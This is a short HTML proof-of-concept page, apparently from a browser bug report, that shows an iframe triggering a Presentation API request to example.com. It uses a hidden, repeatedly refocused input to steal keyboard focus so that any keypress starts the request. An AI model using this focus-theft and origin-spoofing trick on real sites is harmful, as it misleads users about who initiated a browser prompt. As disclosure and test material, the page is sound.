<!doctype html>
<html>
<head>
<style>
html { font-family: sans-serif; }
#focusElem { opacity: 0.00001; width:1px; height:1px; }
</style>
</head>
<body>
<h1>PoC: Presentation initiator spoof, iframe</h1>
<p>Click within iframe (or press any key) to run PoC</p>
<p>iframe on <span id="originOutput"></span></p>
<input id="focusElem">
<script>
originOutput.innerText = window.location.origin;

var runPoC = () => {
  var presentationRequest = new PresentationRequest(['https://example.com']);
  presentationRequest.start();
}
window.addEventListener('click', runPoC);

// Focus theft described in https://crbug.com/622714
setInterval(() => {
  focusElem.focus();
}, 100);
focusElem.addEventListener('keypress', runPoC);
</script>
</body>
</html>
